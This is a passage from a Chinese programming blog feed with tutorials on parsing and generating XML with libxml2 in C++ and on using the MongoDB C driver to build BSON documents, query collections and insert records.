class="name">age</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sex</span>&gt;</span>Man<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hobby</span>&gt;</span>Play Basketball<span class="tag">&lt;/<span class="name">hobby</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Student</span> <span class="attr">id</span>=<span class="string">"0x22222222"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Job<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>20<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sex</span>&gt;</span>Man<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hobby</span>&gt;</span>Play Football<span class="tag">&lt;/<span class="name">hobby</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Student</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">People</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>编译运行 g++ main.cpp -o main <code>xml2-config –libs –cflags</code>&amp;&amp; ./main test.xml</p>
<p>输出信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Version: 1.0</span><br><span class="line">Encoding: UTF-8</span><br><span class="line">ROOT Element: People</span><br><span class="line">1.Student</span><br><span class="line">=&gt; id:0x00000000</span><br><span class="line">         1.name --&gt; Jack</span><br><span class="line">         2.age --&gt; 14</span><br><span class="line">         3.sex --&gt; Man</span><br><span class="line">         4.hobby --&gt; Computer Programming</span><br><span class="line">2.Student</span><br><span class="line">=&gt; id:0x11111111</span><br><span class="line">         1.name --&gt; Tony</span><br><span class="line">         2.age --&gt; 17</span><br><span class="line">         3.sex --&gt; Man</span><br><span class="line">         4.hobby --&gt; Play Basketball</span><br><span class="line">3.Student</span><br><span class="line">=&gt; id:0x22222222</span><br><span class="line">         1.name --&gt; Job</span><br><span class="line">         2.age --&gt; 20</span><br><span class="line">         3.sex --&gt; Man</span><br><span class="line">         4.hobby --&gt; Play Football</span><br></pre></td></tr></table></figure>

<p>可以看到，成功的解析xml文档并格式化的输出信息。这个例子的核心代码就是那个递归函数。现在我们来看看它到底干了些什么。<br>不过在此之前，先谈谈 <strong>xmlParseFile</strong> 和 <strong>xmlReadFile</strong> 的区别。它们都是打开一个XML文档并返回一个文档对象指针 <strong>xmlDocPtr</strong> ，不同之处就在于它们提供的参数不同</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">xmlDocPtr <span class="title">xmlParseFile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span>;</span><br><span class="line"><span class="function">xmlDocPtr <span class="title">xmlReadFile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *URL,**<span class="keyword">const</span> <span class="keyword">char</span> *encoding**,<span class="keyword">int</span> options)</span></span>;</span><br></pre></td></tr></table></figure>

<p>xmlReadFile 以指定的编码格式打开xml文档，而 xmlParseFile 默认以UTF-8编码格式打开文档。<br>比如，刚才的test.xml <strong><?xml version=”1.0” encoding=”UTF-8”?></strong> 中通过encoding指定了UTF-8编码格式，那么用 xmlParseFile 能成功解析，用 xmlReadFile 函数无论<br><strong>const char *encoding</strong> 参数为NULL还是“UTF-8” 也能成功解析。<br>但是 test.xml 只有 <strong><?xml version=”1.0?></strong> 那么 xmlParseFile 会解析失败，而 xmlReadFile 只有 第二个参数为 “UTF-8”时才能解析成功。</p>
<p>好了，继续看那个递归函数吧。。。<br>首先用 <strong>xmlNodePtr xmlNodePtr1= _xmlNodePtr-&gt;children;</strong> 获取的 _xmlNodePtr 节点的所有子节点，然后在while循环中判断每个子节点的类型，<strong>xmlNodePtr1-&gt;type!=XML_TEXT_NODE</strong> 如果不是 XML_TEXT_NODE 那就继续。接着 用 <strong>xmlChildElementCount</strong> 获取 xmlNodePtr1 节点指针的所有子节点个数，并用一个 <strong>ishas_child</strong> 标识是否存在子节点，对于存在子节点的节点，就进行<strong>递归</strong>。然后显示了节点的属性，通过 <strong>xmlHasProp</strong> 判断是否存在指定名字的属性，存在用 <strong>xmlGetProp</strong> 获取其值。注意，我获取了 一个属性对象（链表） <code>xmlAttr* xmlAttr1=xmlNodePtr1-&gt;properties</code> 之后进行遍历。在libxml2中，xmlNode、xmlDoc、xmlAttr 都是一个链表。<br>之后进入递归，depth 只是表示深度，用于格式化输出<br>if(ishas_child){<br>       depth+=10;<br>       ParserXML(depth,xmlNodePtr1);<br>}<br>在进入的每个递归函数执行结束之前减去刚才进入的深度<br>if(depth&gt;0){<br>       depth-=10;<br>}</p>
<p>接下来就是生成XML文档。。。</p>
<h4 id="生成XML文档"><a href="#生成XML文档" class="headerlink" title="生成XML文档"></a>生成XML文档</h4><p>生成就简单一些了，下面是一个例子</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libxml/parser.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libxml/tree.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GenerateXML</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span>&#123;</span><br><span class="line">    xmlDocPtr xmlDocPtr1= xmlNewDoc(BAD_CAST XML_DEFAULT_VERSION);</span><br><span class="line">    <span class="keyword">if</span>(!xmlDocPtr1)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"ERROR: "</span>&lt;&lt;xmlGetLastError()-&gt;message&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建根节点</span></span><br><span class="line">    xmlNodePtr xmlRootPtr=xmlNewNode(<span class="literal">NULL</span>,BAD_CAST<span class="string">"Root"</span>);</span><br><span class="line">    xmlDocSetRootElement(xmlDocPtr1,xmlRootPtr);</span><br><span class="line">    <span class="comment">// 创建一个文本子节点，父节点为 xmlRootPtr</span></span><br><span class="line">    xmlNodePtr  xmlNodePtr1= xmlNewTextChild(xmlRootPtr,<span class="literal">NULL</span>,BAD_CAST<span class="string">"Management"</span>,BAD_CAST<span class="string">"None"</span>);</span><br><span class="line">    <span class="comment">// 添加一个节点，父节点为 xmlNodePtr1</span></span><br><span class="line">    xmlNewTextChild(xmlNodePtr1,<span class="literal">NULL</span>,BAD_CAST<span class="string">"Score"</span>,BAD_CAST<span class="string">"None"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建一个新的节点</span></span><br><span class="line">    xmlNodePtr xmlAnimalPtr= xmlNewNode(<span class="literal">NULL</span>,BAD_CAST<span class="string">"Animals"</span>);</span><br><span class="line">    xmlAddChild(xmlRootPtr,xmlAnimalPtr);</span><br><span class="line">    <span class="comment">// 创建元素</span></span><br><span class="line">    xmlAttrPtr xmlAttrPtr1= xmlNewProp(xmlAnimalPtr,BAD_CAST<span class="string">"Number"</span>,BAD_CAST<span class="string">"888"</span>);</span><br><span class="line">    xmlSetProp(xmlAnimalPtr,BAD_CAST<span class="string">"Number"</span>,BAD_CAST<span class="string">"9999"</span>);</span><br><span class="line"><span class="comment">//    xmlNodeSetName(xmlAnimalPtr,BAD_CAST"The_Animal");</span></span><br><span class="line"><span class="comment">//    xmlRemoveProp(xmlAttrPtr1);</span></span><br><span class="line">    <span class="comment">// 保存文件</span></span><br><span class="line">    <span class="keyword">if</span>(xmlSaveFileEnc(filename,xmlDocPtr1,<span class="string">"UTF-8"</span>))&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"生成 XML 文件成功！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    xmlFreeDoc(xmlDocPtr1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    GenerateXML(<span class="string">"test.xml"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里通用的做法为 <strong>xmlNewDoc</strong> 创建一个新的XML文档并返回一个 xmlDocPtr ，创建一个根节点就是创建一个 xmlNodePtr 并通过 <strong>xmlDocSetRootElement</strong> 设置 xmlDocPtr 的根节点为 xmlNodePtr 。之后在继续添加子节点时，只需在 xmlNodePtr 的基础上创建新节点并添加即可。</p>
<p><strong>xmlNewTextChild</strong> 函数用于文件一个文本子节点。如 <code>&lt;node&gt;Hello&lt;/node&gt;</code></p>
<p>创建新节点的方法为 <strong>xmlNewNode</strong> 它返回一个 xmlNodePtr ，之后 <strong>xmlAddChild</strong> 把一个节点添加到父节点上。</p>
<p>通过 <strong>xmlNewProp</strong> 创建一个属性 xmlAttrPtr ，之后可通过<br><strong>xmlSetProp或xmlNodeSetName</strong> 设置属性的值。删除属性 <strong>xmlRemoveProp</strong></p>
<p>最后，全部OK了， <strong>xmlSaveFileEnc</strong> 来保存XML文档</p>
<p>编译运行生成test.xml，可能格式有点混乱，我修改了一下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Management</span>&gt;</span>None</span><br><span class="line">        <span class="tag">&lt;<span class="name">Score</span>&gt;</span>None<span class="tag">&lt;/<span class="name">Score</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Management</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Animals</span> <span class="attr">Number</span>=<span class="string">"9999"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>OK，基本上解析XML也不算太难。除了libxml2库外，还有其他的库也可以解析XML。看个人爱好了 :)</p>
<p>bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ 调用MongoDB C Driver</title>
    <url>/cpp-call-mongodb-c-driver/</url>
    <content><![CDATA[<p>嗯……环境都准备好了，那么现在可以开始用我们敬爱的C++通过接口来间接操控MongoDB数据库。<br>注意，要有一定的MongoDB数据库基础知识哦～</p>
<a id="more"></a>

<h3 id="启动MongoDB服务器"><a href="#启动MongoDB服务器" class="headerlink" title="启动MongoDB服务器"></a>启动MongoDB服务器</h3><p>首先要做的，就是启动服务器</p>
<blockquote>
<p>mongod –config ${MONGODB}/conf.d/mongo.conf</p>
</blockquote>
<p>要停止服务器，不建议直接<strong>kill</strong>掉，而是加上一个 <strong>–shutdown</strong> 参数</p>
<p>我们还要创建一个可读写指定数据库的用户，比如</p>
<blockquote>
<p>use admin<br>db.createUser({user:’user_test’,pwd:’12345’,roles:[{role:’readWrite’,db:’db_test’}]}</p>
</blockquote>
<p>这里创建了用户 user_test，密码 12345，只能读写数据库 db_test</p>
<h3 id="mongoc"><a href="#mongoc" class="headerlink" title="mongoc"></a>mongoc</h3><p>我们只需引用头文件 libmongoc-1.0/mongoc.h<br>在 <strong>main</strong> 函数要调用 <strong>mongoc_init()</strong> 来初始化库以及结尾 <strong>mongoc_cleanup()</strong> 来释放</p>
<p>要连接到MongoDB数据库，就得提供一个连接字符串，类似于</p>
<p>mongodb://username:password@host:port/db<br>例如： mongodb://localhost:27017表示连接到本地回环地址127.0.0.1，以及端口27017的服务器，这个连接方式无需验证身份(没有开启 <strong>auth</strong>)。<br>然而，这个例子的连接字符串为： <strong>mongodb://user_test:<a href="mailto:12345@127.0.0.1" target="_blank" rel="noopener">12345@127.0.0.1</a>:27017/db_test</strong></p>
<p>有了连接字符串，那么我们怎么连接到服务器？可以通过 mongoc_client_get_database() 来建立一个client</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">mongoc_client_t</span> * <span class="title">mongoc_client_new</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *uri_string)</span></span>;</span><br></pre></td></tr></table></figure>

<p>该函数返回一个 mongoc_client_t* 结构指针，之后的操作就是通过该指针来访问 database、collection……</p>
<blockquote>
<p>除了直接通过一个连接字符串来建立client，还可以‘构造’一个 <strong>uri</strong> 建立client。这一步也很简单，可以调用 <strong>mongoc_uri*</strong> 系列函数，再<br> mongoc_client_new_from_uri()，如：<br>mongoc_uri_t <em>uri=mongoc_uri_new(“mongodb://127.0.0.1:27017”);<br>mongoc_uri_set_database(uri,”xxxx”);<br>mongoc_uri_set_username(uri,”xxxx”);<br>mongoc_uri_set_password(uri,”xxxx”);<br>mongoc_client_t</em> client= mongoc_client_new_from_uri(uri);</p>
</blockquote>
<p>连接成功后，可以通过来获取 <strong>mongoc_client_get_default_database</strong> 来获取默认的数据库（前提是刚才连接字符串提供了一个数据库），或者 <strong>mongoc_client_get_database</strong> 来获取指定名称的数据库</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">mongoc_database_t</span> * <span class="title">mongoc_client_get_database</span> <span class="params">(<span class="keyword">mongoc_client_t</span> *client, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">mongoc_database_t</span> * <span class="title">mongoc_client_get_default_database</span> <span class="params">(<span class="keyword">mongoc_client_t</span> *client)</span></span>;</span><br></pre></td></tr></table></figure>

<p>通过 mongoc_database_has_collection() 判断是否存在一个 collection</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mongoc_database_has_collection</span> <span class="params">(<span class="keyword">mongoc_database_t</span> *database,<span class="keyword">const</span> <span class="keyword">char</span> *name,<span class="keyword">bson_error_t</span> *error)</span></span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">bson_error_t</span> &#123;</span></span><br><span class="line">   <span class="keyword">uint32_t</span> domain;</span><br><span class="line">   <span class="keyword">uint32_t</span> code;</span><br><span class="line">   <span class="keyword">char</span> message[BSON_ERROR_BUFFER_SIZE];</span><br><span class="line">&#125; <span class="keyword">bson_error_t</span>;</span><br></pre></td></tr></table></figure>

<p>有了database，那么就可以获取某个collection，方法有两个</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">mongoc_collection_t</span> * <span class="title">mongoc_client_get_collection</span> <span class="params">(<span class="keyword">mongoc_client_t</span> *client,<span class="keyword">const</span> <span class="keyword">char</span> *db,<span class="keyword">const</span> <span class="keyword">char</span> *collection)</span></span>;</span><br><span class="line"><span class="keyword">mongoc_collection_t</span> *</span><br><span class="line">mongoc_database_get_collection (<span class="keyword">mongoc_database_t</span> *database, <span class="keyword">const</span> <span class="keyword">char</span> *name);</span><br></pre></td></tr></table></figure>

<p>接下来，就是重头戏了</p>
<h4 id="Creating-BSON-Documents"><a href="#Creating-BSON-Documents" class="headerlink" title="Creating BSON Documents"></a>Creating BSON Documents</h4><p>BSON，类似与JSON，但又有点不同。通过创建BSON Document来实现与MongoDB的交互。如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&gt; db.test.insert(&#123;'name':'xiaoming','age':10,info:['shy','helpful']&#125;)</span><br><span class="line">&gt; db.test.find().pretty()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="attr">"_id"</span> : ObjectId(<span class="string">"5a8e1dced077dc147db71f81"</span>),</span><br><span class="line">	<span class="attr">"name"</span> : <span class="string">"xiaoming"</span>,</span><br><span class="line">	<span class="attr">"age"</span> : <span class="number">10</span>,</span><br><span class="line">	<span class="attr">"info"</span> : [</span><br><span class="line">		<span class="string">"shy"</span>,</span><br><span class="line">		<span class="string">"helpful"</span></span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>BSON文档就有点类似与 {‘name’:’xiaoming’,’age’:10,info:[‘shy’,’helpful’]}</p>
<p>mongoc有几种方式创建BSON文档： <strong>appending key-value pairs, using BCON, or parsing JSON</strong><br>其中，最简单的就是BCON，不过再次之前先了解下使用 bson**，只需引用 bson.h 即可</p>
<h5 id="bson"><a href="#bson" class="headerlink" title="bson"></a>bson</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个BSON文档</span></span><br><span class="line"><span class="keyword">bson_t</span> *doc=bson_new();</span><br><span class="line"><span class="comment">// 添加一个 UTF-8 字符串，-1 表示该字符串长度</span></span><br><span class="line">bson_append_utf8(doc,<span class="string">"name"</span>,<span class="number">-1</span>,<span class="string">"xiaodong"</span>,<span class="number">-1</span>);</span><br><span class="line"><span class="comment">// 添加一个 int32 整数</span></span><br><span class="line">bson_append_int32(doc,<span class="string">"age"</span>,<span class="number">-1</span>,<span class="number">10</span>);</span><br><span class="line">BSON_APPEND_UTF8(doc,<span class="string">"name"</span>,<span class="string">"xiaoqiang"</span>);</span><br><span class="line">BSON_APPEND_INT32(doc,<span class="string">"age"</span>,<span class="number">11</span>);</span><br><span class="line"><span class="comment">// 返回一个 JSON 字符串</span></span><br><span class="line"><span class="keyword">char</span> *jsonstr= bson_as_canonical_extended_json(doc,<span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(jsonstr)</span><br><span class="line"><span class="comment">// 释放由 bson_as_canonical_extended_json 返回char *</span></span><br><span class="line">bson_free(jsonstr);</span><br><span class="line"><span class="comment">// 释放 bson_new 分配的内存</span></span><br><span class="line">bson_destroy(doc);</span><br></pre></td></tr></table></figure>

<p>结果<br>{ “name” : “xiaodong”, “age” : { “$numberInt” : “10” }, “name” : “xiaoqiang”, “age” : { “$numberInt” : “11” } }</p>
<p>可通过 bson** 系列函数 或者 BSON**宏 来添加BSON文档<br>通过 bson_t 获取 JSON 字符串，可以调用以下函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">bson_as_canonical_extended_json</span><span class="params">(<span class="keyword">const</span> <span class="keyword">bson_t</span> *bson, <span class="keyword">size_t</span> *length)</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">bson_as_json</span><span class="params">(<span class="keyword">const</span> <span class="keyword">bson_t</span> *bson, <span class="keyword">size_t</span> *length)</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">bson_as_relaxed_extended_json</span><span class="params">(<span class="keyword">const</span> <span class="keyword">bson_t</span> *bson, <span class="keyword">size_t</span> *length)</span></span></span><br></pre></td></tr></table></figure>

<p>必须要有对应的 <strong>bson_free()</strong> 来释放该分配的内存；<strong>bson_destroy()</strong> 来释放一个BSON文档</p>
<h5 id="BCON"><a href="#BCON" class="headerlink" title="BCON"></a>BCON</h5><p>用 BCON_* 宏来操控BSON Document我认为更简单些，而且写法也更高级。</p>
<blockquote>
<p>BSON C Object Notation, BCON for short, is an alternative way of constructing BSON documents in a manner closer to the intended format. <strong>It has less type-safety than BSON’s append functions but results in less code</strong></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bson_t</span> *bson=BCON_NEW(</span><br><span class="line">            <span class="string">"name"</span>,BCON_UTF8(<span class="string">"xiaoHong"</span>),</span><br><span class="line">            <span class="string">"age"</span>,BCON_INT32(<span class="number">15</span>),</span><br><span class="line">            <span class="string">"info"</span>,</span><br><span class="line">            <span class="string">"["</span>,</span><br><span class="line">               <span class="string">"&#123;"</span>,<span class="string">"country"</span>,BCON_UTF8(<span class="string">"China"</span>), <span class="string">"&#125;"</span>,</span><br><span class="line">               <span class="string">"&#123;"</span>,<span class="string">"phone"</span>,BCON_UTF8(<span class="string">"110"</span>), <span class="string">"&#125;"</span>,</span><br><span class="line">            <span class="string">"]"</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>{ “name” : “xiaoHong”, “age” : { “$numberInt” : “15” }, “info” : [ { “country” : “China” }, { “phone” : “110” } ] }</p>
<p>通过使用 BCON_* 函数更直观、方便简单的创建BSON文档。</p>
<h4 id="Creating-BSON-from-JSON"><a href="#Creating-BSON-from-JSON" class="headerlink" title="Creating BSON from JSON"></a>Creating BSON from JSON</h4><p>上面介绍了创建一个BSON文档以及从BSON文档获取一个JSON字符串。<br>那么，我们是否可以通过JSON字符串反向解析一个BSON文档呢？答案是肯定的。不过，这好像是对于单文档而言，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bson_t</span> * <span class="title">bson_new_from_json</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span> *data, <span class="keyword">ssize_t</span> len, <span class="keyword">bson_error_t</span> *error)</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *json = <span class="string">"&#123;\"name\":\"xiaoJun\",\"age\":15&#125;"</span>;</span><br><span class="line"><span class="keyword">bson_t</span> *newbs= bson_new_from_json((<span class="keyword">const</span> <span class="keyword">uint8_t</span>*)json,<span class="number">-1</span>,<span class="literal">NULL</span>);</span><br><span class="line">jsonstr=bson_as_canonical_extended_json(newbs,<span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(json);</span><br><span class="line">bson_free(jsonstr);</span><br><span class="line">bson_destroy(newbs);</span><br></pre></td></tr></table></figure>

<p>有了这些基础后，那么接下来就不会那么吃力了</p>
<h4 id="遍历-collections"><a href="#遍历-collections" class="headerlink" title="遍历 collections"></a>遍历 collections</h4><p>在MongoDB交互shell中，我们可以直接通过 <code>db.test.find().pretty()</code> 来列出所有的数据。注意 find() 是可以提供参数的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> db.test.find</span></span><br><span class="line">function (query, fields, limit, skip, batchSize, options) &#123;</span><br><span class="line">    var cursor = new DBQuery(this._mongo,</span><br><span class="line">                             this._db,</span><br><span class="line">                             this,</span><br><span class="line">                             this._fullName,</span><br><span class="line">                             this._massageObject(query),</span><br><span class="line">                             fields,</span><br><span class="line">                             limit,</span><br><span class="line">                             skip,</span><br><span class="line">                             batchSize,</span><br><span class="line">                             options || this.getQueryOptions());</span><br><span class="line">    &#123;</span><br><span class="line">        const session = this.getDB().getSession();</span><br><span class="line">        const readPreference = session._serverSession.client.getReadPreference(session);</span><br><span class="line">        if (readPreference !== null) &#123;</span><br><span class="line">            cursor.readPref(readPreference.mode, readPreference.tags);</span><br><span class="line">        &#125;</span><br><span class="line">        const readConcern = session._serverSession.client.getReadConcern(session);</span><br><span class="line">        if (readConcern !== null) &#123;</span><br><span class="line">            cursor.readConcern(readConcern.level);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return cursor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mongoc提供了 <strong>mongoc_collection_find_with_opts</strong> 函数来获取一个 游标(<strong>Cursor</strong>) ，注意 <strong>mongoc_collection_find</strong> 被弃用了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">mongoc_cursor_t</span> * <span class="title">mongoc_collection_find_with_opts</span> <span class="params">(<span class="keyword">mongoc_collection_t</span> *collection,<span class="keyword">const</span> <span class="keyword">bson_t</span> *filter,<span class="keyword">const</span> <span class="keyword">bson_t</span> *opts,<span class="keyword">const</span> <span class="keyword">mongoc_read_prefs_t</span> *read_prefs)</span></span></span><br></pre></td></tr></table></figure>

<p><strong>mongoc_collection_find_with_opts</strong> 要求4个参数，参数我们只关注前两个参数，其中 <strong>bson_t *filter</strong> 至关重要，类似于 MYSQL select <em>from tb_xxx *where id = 5</em></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 空BSON文档 &#123;&#125;</span></span><br><span class="line"><span class="keyword">bson_t</span> *bson=BCON_NEW(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">mongoc_cursor_t</span> *<span class="built_in">cursor</span>= mongoc_collection_find_with_opts(coll,bson,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 获取当前文档，注意是一个 const bson_t *，并传入 mongoc_cursor_next 第二个参数</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">bson_t</span> *ps=mongoc_cursor_current(<span class="built_in">cursor</span>);</span><br><span class="line"><span class="keyword">while</span> (mongoc_cursor_next(<span class="built_in">cursor</span>,&amp;ps))</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">char</span> *json=bson_as_canonical_extended_json(ps,&amp;<span class="built_in">size</span>);</span><br><span class="line">       <span class="built_in">printf</span>(json);</span><br><span class="line">       bson_free(json);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 释放 cursor</span></span><br><span class="line">mongoc_cursor_destroy(<span class="built_in">cursor</span>);</span><br></pre></td></tr></table></figure>

<p>bson_t <em>bson=BCON_NEW(NULL); 等价于 db.test.find({}) 或者 db.test.find()当然，也可以这么来写bson_t</em> bson=BCON_NEW(“age”,”{“,”$gt”,BCON_INT32(13),”}”);<br>这就类似于 db.test.find({‘age’:{‘$gt’:13}})</p>
<h4 id="增删查改"><a href="#增删查改" class="headerlink" title="增删查改"></a>增删查改</h4><p>像大多数数据库一样，增删查改是必不可少的基本步骤。</p>
<h5 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">MONGOC_EXPORT (<span class="keyword">bool</span>)</span><br><span class="line">mongoc_collection_insert (<span class="keyword">mongoc_collection_t</span> *collection,</span><br><span class="line">                          <span class="keyword">mongoc_insert_flags_t</span> flags,</span><br><span class="line">                          <span class="keyword">const</span> <span class="keyword">bson_t</span> *document,</span><br><span class="line">                          <span class="keyword">const</span> <span class="keyword">mongoc_write_concern_t</span> *write_concern,</span><br><span class="line">                          <span class="keyword">bson_error_t</span> *error);</span><br><span class="line">MONGOC_EXPORT (<span class="keyword">bool</span>)</span><br><span class="line">mongoc_collection_insert_one (<span class="keyword">mongoc_collection_t</span> *collection,</span><br><span class="line">                              <span class="keyword">const</span> <span class="keyword">bson_t</span> *document,</span><br><span class="line">                              <span class="keyword">const</span> <span class="keyword">bson_t</span> *opts,</span><br><span class="line">                              <span class="keyword">bson_t</span> *reply,</span><br><span class="line">                              <span class="keyword">bson_error_t</span> *error);</span><br><span class="line">MONGOC_EXPORT (<span class="keyword">bool</span>)</span><br><span class="line">mongoc_collection_insert_many (<span class="keyword">mongoc_collection_t</span> *collection,</span><br><span class="line">                               <span class="keyword">const</span> <span class="keyword">bson_t</span> **documents,</span><br><span class="line">                               <span class="keyword">size_t</span> n_documents,</span><br><span class="line">                               <span class="keyword">const</span> <span class="keyword">bson_t</span> *opts,</span><br><span class="line">                               <span class="keyword">bson_t</span> *reply,</span><br><span class="line">                               <span class="keyword">bson_error_t</span> *error);</span><br></pre></td></tr></table></figure>

<p>千万别被这么多参数给吓倒了。这里我们只需关注</p>
<blockquote>
<p>mongoc_collection_t <em>collectionconst bson_t \</em>document<br>bson_error_t *error(可选，表示错误信息)</p>
</blockquote>
<p>下面是一个简单的例子，省略了大部分代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bson_t</span> *bson=BCON_NEW(</span><br><span class="line">            <span class="string">"name"</span>,BCON_UTF8(<span class="string">"xiaoDong"</span>),</span><br><span class="line">            <span class="string">"age"</span>,BCON_INT32(<span class="number">18</span>),</span><br><span class="line">            <span class="string">"info"</span>,</span><br><span class="line">            <span class="string">"["</span>,</span><br><span class="line">               <span class="string">"&#123;"</span>,<span class="string">"country"</span>,BCON_UTF8(<span class="string">"China"</span>), <span class="string">"&#125;"</span>,</span><br><span class="line">               <span class="string">"&#123;"</span>,<span class="string">"phone"</span>,BCON_UTF8(<span class="string">"150"</span>), <span class="string">"&#125;"</span>,</span><br><span class="line">            <span class="string">"]"</span></span><br><span class="line">        );</span><br><span class="line"><span class="comment">// 插入数据</span></span><br><span class="line">retr=mongoc_collection_insert_one(coll,,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;error);</span><br><span class="line"><span class="keyword">if</span>(!retr)&#123;</span><br><span class="line">     <span class="built_in">printf</span>(error.message);</span><br><span class="line">&#125;</span><br><span class="line">bson_destroy(bson);</span><br></pre></td></tr></table></figure>

